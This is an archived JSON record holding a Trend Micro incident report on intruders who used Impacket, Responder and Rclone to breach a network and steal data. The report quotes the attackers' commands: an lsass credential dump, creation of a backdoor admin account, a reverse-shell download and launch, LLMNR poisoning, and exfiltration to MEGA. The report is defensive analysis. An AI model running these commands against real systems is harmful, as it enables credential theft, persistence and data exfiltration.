{
    "id": "b5b650d2-2104-404d-8683-91bb7dfc2360",
    "created_at": "2023-01-12T15:02:29.453899Z",
    "updated_at": "2025-03-27T02:05:26.028018Z",
    "deleted_at": null,
    "sha1_hash": "0e6e1dfeae940d26553aa1f45f13e1b2a06cc20f",
    "title": "2022-07-20 - Analyzing Penetration-Testing Tools That Threat Actors Use to Breach Systems and Steal Data",
    "authors": "",
    "file_creation_date": "2022-08-18T03:29:37Z",
    "file_modification_date": "2022-08-18T03:29:37Z",
    "file_size": 1519248,
    "plain_text": "# Analyzing Penetration-Testing Tools That Threat Actors Use to Breach Systems and Steal Data\n\n**[trendmicro.com/en_us/research/22/g/analyzing-penetration-testing-tools-that-threat-actors-use-to-br.html](https://www.trendmicro.com/en_us/research/22/g/analyzing-penetration-testing-tools-that-threat-actors-use-to-br.html)**\n\nJuly 20, 2022\n\nWe discovered the use of two Python penetration-testing tools, Impacket and Responder,\nthat malicious actors used to compromise systems and exfiltrate data. We share our key\nfindings in this report.\n\nBy: Joelson Soares, Buddy Tancio, Erika Mendoza, Jessie Prevost, Nusrath Iqra\nJuly 20,\n2022\nRead time: ( words)\n\nThe use of legitimate Windows tools as part of malicious actors’ malware arsenal has\nbecome a common observation in cyber incursions in recent years. We’ve discussed such\n[use in a previous article where PsExec,](https://www.trendmicro.com/vinfo/br/security/news/cybercrime-and-digital-threats/updated-analysis-on-nefilim-ransomware-s-behavior) [Windows Management Instrumentation (WMI),](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)\n[simple batch files or third-party tools such as PC Hunter and](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/PUA.Win64.PCHunter.A/) [Process Hacker were used to](https://processhacker.sourceforge.io/)\ndisable endpoint security products, move laterally across networks, and exfiltrate information,\namong others. We have also extensively discussed legitimate tools that malicious actors\n[weaponized for ransomware in 2021.](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/locked-loaded-and-in-the-wrong-hands-legitimate-tools-weaponized-for-ransomware-in-2021)\n\nWe uncovered two Python tools, Impacket and Responder, in our latest investigation. While\nthe two are not new, they are nonetheless worth noting since both are normally used for\npenetration testing. Knowing that cybercriminals often upgrade their tactics, techniques, and\nprocedures (TTPs) to broaden their scope and stay competitive, system defenders these\ndays have come to expect attackers’ crafty use of legitimate tools for nefarious ends.\n\nImpacket and Responder defined\n\n[SecureAuth, the developer of Impacket, defines it as a set of Python classes for working with](https://www.secureauth.com/labs/open-source-tools/impacket/)\nnetwork protocols. It offers low-level programmatic access to the packets and some protocols\n(such as [SMB and](https://docs.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview) [MSRPC) or the protocol implementation itself. It also provides tools that](https://docs.microsoft.com/en-us/windows/win32/rpc/rpc-start-page)\nenable a user to accomplish remote execution such as smbexec.py for use when the target\nmachine does not have an available writeable share.\n\n[Responder, on the other hand, is a Windows environment takeover tool that is widely used](https://github.com/lgandx/Responder)\n[for internal penetration testing. According to MITRE ATT&CK®, the main purpose of this](https://attack.mitre.org/software/S0174/)\nopen-source tool is to “poison name services to gather hashes and credentials from systems\nwithin a local network.” Once the attackers poison the name services, Responder harvests\n\n\n-----\n\n[the hashes and credentials. The tool is also used to poison LLMNR,](https://www.microsoft.com/en-us/research/publication/link-local-multicast-name-resolution-llmnr/#:~:text=The%20goal%20of%20Link%2DLocal,with%20a%20distinct%20resolver%20cache.) [NBT-NS and](https://www.techtarget.com/searchnetworking/definition/NetBIOS#:~:text=NetBIOS%20(Network%20Basic%20Input%2FOutput%20System)%20is%20a%20network,%2C%20IBM%2Ddeveloped%20PC%20networks.) [MDNS with](https://www.ionos.com/digitalguide/server/know-how/multicast-dns/)\nbuilt-in HTTP, SMB, MSSQL, FTP, and LDAP rogue authentication server supporting\nNTLMv1, NTLMv2/LMv2, Extended Security NTLMSSP, and basic HTTP authentication.\nMany consider it as an essential penetration-testing tool.\n\nWhile there is more mention of Windows tools, Linux is just as vulnerable to such\nsurreptitious methods. There is, in fact, a [long list of Linux binaries that malicious actors can](https://gtfobins.github.io/)\nexploit “to break out restricted shells, escalate or maintain elevated privileges, transfer files,\nspawn bind and reverse shells, and facilitate other post-exploitation tasks.” Malicious actors\ninevitably vascillate between Windows and Linux nowadays as the use of cloud technology\nand the implementation of remote work continue to expand.\n\nThat Python runs on both Windows and Linux makes our findings significant. While\norganizations leverage the versatility of using both systems, this versatility is a double-edged\nsword in that it also provides more opportunities for cybercriminals to launch attacks, as we\nshow in our findings.\n\nStages of investigation: Key findings\n\nSince malicious actors stealthily employed legitimate tools in many stages of the attacks,\ndetecting incursions from the samples we saw was tricky. The threat hunting team’s\ninvestigation was triggered by the following event, which was observed in multiple hosts:\n\nFigure 1. Service event log that triggered the threat hunting team’s investigation of\nsuspicious activity\nIn addition, we observed credential dumping activities in a single host one day prior to the\nservice event.\n\n\n-----\n\nC:\\Windows\\system32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll MiniDump 884\nC:\\lsass.dmp ull\n\n“C:\\Windows\\system32\\rundll32.exe” C:\\windows\\System32\\comsvcs.dll MiniDump 884\nC:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\lsass.dmp\nfull\n\nFigure 2. Trend Micro Vision One™ – Workbench trigger observed for dumping of lsass.exe\nvia Comsvcs\nThe unusual combination of the aforementioned events prompted the Trend Micro Managed\nDetection and Response (MDR) team to inspect all the endpoints that were observed to be\naffected by the suspicious activities. We discovered that the suspicious random service was\npresent in 27 endpoints. The list of endpoints grew as we investigated further, but we will\nonly cover the hosts that are noteworthy.\n\n\n-----\n\nFigure 3. Timeline of events (Click to enlarge)\n**Credential dumping in a Windows-run host**\n\nAs mentioned earlier, the first sign of attack that we observed in this incident was the\ncredential dumping activity in a client’s Windows host through the customer’s compromised\nmachine that the team first identified. The command used was as follows:\n\npowershell rundll32.exe C:\\windows\\System32\\comsvcs.dll MiniDump (Get-Process\nlsass).id\n\nCuriously, the attackers attempted to place the lsass.dmp file in an unlikely location related to\nMicrosoft Exchange:\n\nC:\\Program Files\\Microsoft\\Exchange\nServer\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\lsass.dmp\n\nThis suggested a possible compromise through a Microsoft Exchange exploit. However,\nthere was no evidence that the file-write attempt was successful. Instead, the lsass dump\nwas written in C:\\lsass.dmp after the malicious actors’ next successful attempt.\n\n**Patient zero and a possible compromised account**\n\nPrior to the credential dumping activity that we observed, there were scattered clues of a\npossible compromise, although these events weren’t definitive. For example, in the\ncustomer’s Active Directory (AD), the second compromised account that we identified was\nused by the attackers to log in through remote desktop protocol (RDP). A day later, we noted\na user discovery command in the aforementioned compromised Windows AD:\n\n\n-----\n\ncmd.exe /c net user {username} /domain\n\nAfter closely monitoring this for a week, we noticed the credential dumping activity and saw\nthe repeated attempt of the malicious actors to use this account to perform the following\nnetwork login activities:\n\nFigure 4. Customer’s network log of activities in the compromised Windows AD\nWe can see from the network log that the login can be traced to the customer’s second\ncompromised Windows host. However, further scrutiny of the host revealed that there was no\nindication of compromise. Later on, we found that the IP address the attackers used was\nassigned to a Linux host. The discrepancy in host name resolution might be due to an\n[unintentional Windows issue or a deliberate attempt of LLMNR/NBT-NS poisoning through a](https://predatech.co.uk/llmnr-nbt-ns-poisoning-windows-domain-environments/#:~:text=LLMNR%2FNBT%2DNS%20poisoning%20can,users%20working%20on%20their%20computers.)\ntool that we discuss in the following section.\n\n**Service creation**\n\n[Based on the information shown in Figure 5, it is possible that patient zero is the customer’s](https://www.ibm.com/docs/en/qsip/7.4?topic=investigations-patient-zero-identify-source-attack)\ncompromised Linux host. However, we had no visibility of this host prior to the investigation\nto prove this theory. This assumption is premised on the fact that the first observed\nsuspicious login came from the aforementioned host. We also discovered later on that the\nattackers used another compromised user account to perform the suspicious activities.\n\n\n-----\n\nFigure 5. Event log of service creation by the malicious actors\n**New user account created via Impacket**\n\nThe service that the threat hunting team initially flagged turned out to be an event generated\nby the penetration-testing tool, smbexec.py from Impacket, which we have seen in previous\ncases. However, this event is unusual because it executed a net.exe command instead of\nrunning a malicious application. The goal of the command is to create a new user and to add\nit to the local administrator group based on the following command:\n\n%COMSPEC% /Q /c echo net user xxxxx Xxxx123!@# /add & net localgroup\nAdministrators (username) /add ^> %SYSTEMROOT%\\Temp__output >\n%TEMP%\\execute.bat & %COMSPEC% /Q /c %TEMP%\\execute.bat & del\n%TEMP%\\execute.bat\n\nThe command was executed in various hosts. The login and logout events that we\nsubsequently observed were sufficient evidence of this account being repeatedly used,\nimplying that the new user account was intended for use as a fail-safe method to regain\naccess to compromised accounts in case the malicious actors lose it.\n\n**Execution of suspicious commands from the compromised endpoint manager server**\n\n[As we continued our investigation, we recommended the installation of the MDR agent to the](https://www.trendmicro.com/en_my/business/products/user-protection/sps/endpoint/managed-detection-response.html)\n[customer and instructed them to enable effective detection and response (EDR) capabilities.](https://www.trendmicro.com/en_my/business/products/user-protection/sps/endpoint/detection-response.html)\nThese measures cut off the malicious actors’ network access. After a few days, while the\ncustomer was recovering from the attacks and implementing cybersecurity best practices, we\nobserved the malicious actors attempting to reconnect to the network using the customer’s\nendpoint manager server.\n\n\n-----\n\nFigure 6. The Trend Micro Vision One root cause analysis (RCA) execution profile showing\nthe execution of several interesting commands in the server involving php-cgi, bash, and\nwget (Click to enlarge)\n\nFigure 7. The Trend Micro Vision One RCA execution profile showing the source process as\n‘”broker”, which is a binary under the Vision One Endpoint Manager’s solution directory (Click\nto enlarge)\nHere are more details of the events illustrated in the progressive root cause analysis (PRCA)\nin Figure 7:\n\nOAT name: Read Access On Unix Password File\n\nlogonUser: nobody\n\nprocessFilePath: /usr/bin/php-cgi\n\nobjectFilePath: /usr/bin/bash\n\nobjectCmd: sh -c cat /etc/passwd\n\nThe observed attack technique (OAT) detection indicates that the php-cgi process represents\na “/bin/bash” shell”and is directly reading “passwd”, suggesting that the server might have\nbeen compromised. The following shows that the malicious actors carried out more actions\nafter the initial OAT detection.\n\nThe malicious actors downloaded revssh64 from bashupload:\n\n(OAT name: Wget Execution / Download Via Curl Or Wget)\n\nlogonUser: nobody\n\nprocessFilePath: /usr/bin/bash\n\nprocessCmd: sh -c wget hXXps://bashupload.com/aDYl5/revssh64 -O /tmp/lin\n\nparentFilePath: /usr/bin/php-cgi\n\n\n-----\n\nFigure 8. Trend Micro Vision One RCA execution profile showing the download of revssh64\nfrom bashupload (Click to enlarge)\nAfterward, the attackers used chmod to change the permission of the executable to rwx-rwxrwx, thus making it executable by anyone:\n\n(OAT name: Set Execute Attribute Via Chmod)\n\nlogonUser:nobody\n\nprocessFilePath: /usr/bin/bash\n\nprocessCmd: sh -c chmod 777 /tmp/lin\n\nparentFilePath: /usr/bin/php-cgi\n\nNext, they executed revshell from temp directory:\n\n(OAT name: Processes Running Detected From Tmp Directory)\n\nlogonUser: nobody\n\nprocessCmd: sh -c /tmp/./lin -b 5155\n\nobjectFilePath: /tmp/lin\n\nparentCmd: /usr/bin/php-cgi\n\n\n-----\n\nFigure 9. Trend Micro Vision One RCA execution profile showing execution of revshell from\ntemp directory (Click to enlarge)\nThe malicious actors elevated privileges to root:\n\n(OAT name: Elevating privileges to root)\n\nFile path: /usr/bin/su\n\nCLI command: su srvroot\n\nUser account: nobody\n\nNext, they executed revshell (as shown on Figure 9) on a different port with root credentials:\n\n(OAT name: Unknown Process Launched From TMP Directory)\n\nlogonUser: root\n\nprocessFilePath: /tmp/lin\n\nprocessCmd: /tmp/./lin -b 6155\n\nAt this point, the malicious actors proceeded to execute Responder to poison LLMNR based\non the options used in the command-line interface (CLI), as follows:\n\n\n-----\n\n(OAT name: Python Execution – Linux)\nCLI command:\n\npython Responder.py –help\n\nCLI command: python Responder.py -I eth0 --lm -of /opt/landesk/Responder/logs/\n\nUser account: root\n\nCLI command: python Responder.py -I eth0 -w -r --lm -v\n\nUser account: root\n\nFollowing the aforementioned detections, we saw some internal computers communicating\nwith the attackers’ IP address, from internal-ip:445 (SMB) to attacker-ip:443 (HTTPS).\n\n**Use of Responder**\n\nPreviously, we mentioned that there was a discrepancy between the name resolution of\nhosts from the first suspicious login event seen in the client’s compromised Windows AD.\nThe discrepancy might be due to the use of Responder early on. As shown on Figure 10\n[(diagram retrieved here), Responder is capable of listening to the network to anticipate](https://sleepysysadmin.com/blue-teaming-defending-against-responder-py)\npassword hashes and usernames. If a Windows client cannot resolve a host name using\nDNS. In this case, it will use the LLMNR protocol or NBT-NS to ask nearby computers. This\nis when Responder takes action: It listens to the network for any LLMNR/NBT-NS broadcast,\nthen it poisons the requests by impersonating the machine that the Windows client intends to\nconnect to. The Windows client subsequently passes the username and password hash to\nthe Responder tool. The collected password NTLM hash can then be cracked by the\n[attackers using tools such as John the Ripper.](https://www.csoonline.com/article/3564153/john-the-ripper-explained-an-essential-password-cracker-for-your-hacker-toolkit.html)\n\n\n-----\n\nFigure 10. Responder tool capability\n**Data exfiltration through Rclone and MegaSync**\n\nFigure 11. Rclone and MegaSync execution\n[HackTool.Win32.RAdmin.GB is a tool that allows malicious actors to execute arbitrary](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/HackTool.Win32.Radmin.GB)\ncommands remotely from a compromised machine. This tool can spawn cmd.exe, which in\n[turn launches Rclone, a command-line program to manage files on cloud storage, to](https://rclone.org/)\nexfiltrate data to [MegaSync using the following command lines:](https://megasync.en.softonic.com/)\n\n\n-----\n\ncmd.exe /c C:\\ProgramData\\System\\svchost.exe copy Source_directory mega:folder q -\nignore-existing --auto-confirm --multi-thread-streams 10 --transfers 10 --no-console --config\n\n\"C:\\ProgramData\\System\\svchost.conf\"\n\nThe .conf file contains the username and password of the account that the malicious actors\nused to exfiltrate the data from Rclone to MegaSync. These accounts were no longer\nworking when we tried to access them again.\n\nFigure\n\n12. The .conf file containing the username and password of the account used to exfiltrate\ndata from Rclone to MegaSync\n\n\n-----\n\nFigure 13.\n\nHackTool.Win32.RAdmin.GB installed as a service in the compromised machine\n\nFigure 14. Trend Micro Vision One RCA execution profile showing Rclone impersonating the\nfile name of svchost.exe to exfiltrate data\nSecurity recommendations\n\nMDR teams can do their job effectively if organizations enable their monitoring solution to the\nwhole environment. There should also be heightened awareness among stakeholders of the\nrisks emanating from the lack of network visibility, as they might unknowingly leave their\n\n\n-----\n\nsystems vulnerable and thus make the job of security teams much harder. The lack of\nvisibility in an organization’s system makes it easier for attackers to modify their TTPs and\npersist in the system, inflicting more harm on an enterprise.\n\nThe adoption of a proactive cybersecurity mindset and the consistent implementation of\ncybersecurity hygiene practices are crucial to mitigate risks and prevent a system breach.\nSince the threat landscape is ever-changing, the information economy must contend with this\ncontinuous evolution of risks and threats. We recommend that organizations implement the\nfollowing security best practices:\n\n**Ensure programs and devices are internet-facing only when absolutely**\n**necessary. Exposing portions of your cloud infrastructure creates an opportunity for**\nmalicious actors to access your environment.\n**Prioritize internet-facing infrastructure and critical systems for system upgrades**\n**and patch deployment. Keep your software applications and operating systems up to**\ndate with the latest security patches. Disable or replace outdated and vulnerable\nprotocols, such as LLMNR and NBT-NS, that allow malicious actors to easily escalate\nprivilege.\n**Enable a monitoring solution with visibility across the entire organization. Blind**\nspots in security and monitoring can lead to undetected and prolonged compromise.\n**Ensure that 30 to 60 days’ worth of event logging is available for analysis. In case**\nof a prolonged compromise, such data will aid investigations conducted by MDR teams\nto identify the scope of compromised endpoints. Adjust local storage thresholds and\nretention parameters or consider a centralized logging location.\n\n**Trend Micro solutions**\n\nTo ensure all bases are covered, we recommend security solutions that provide\ncomprehensive protection for your system to keep this and other threats at bay.\n\n[Trend Micro Vision One™ helps security teams gain an overall view of attempts in ongoing](https://www.trendmicro.com/en_us/business/services/managed-xdr.html)\ncampaigns by providing them with a correlated view of multiple layers such as email,\nendpoints, servers, and cloud workloads. Security teams can gain a broader perspective and\na better understanding of attack attempts and detect suspicious behavior that would\notherwise seem benign when viewed from a single layer alone.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-07-20 - Analyzing Penetration-Testing Tools That Threat Actors Use to Breach Systems and Steal Data.pdf"
    ],
    "report_names": [
        "2022-07-20 - Analyzing Penetration-Testing Tools That Threat Actors Use to Breach Systems and Steal Data.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535749,
    "ts_updated_at": 1743041126,
    "ts_creation_date": 1660793377,
    "ts_modification_date": 1660793377,
    "files": {
        "pdf": "https://archive.orkl.eu/0e6e1dfeae940d26553aa1f45f13e1b2a06cc20f.pdf",
        "text": "https://archive.orkl.eu/0e6e1dfeae940d26553aa1f45f13e1b2a06cc20f.txt",
        "img": "https://archive.orkl.eu/0e6e1dfeae940d26553aa1f45f13e1b2a06cc20f.jpg"
    }
}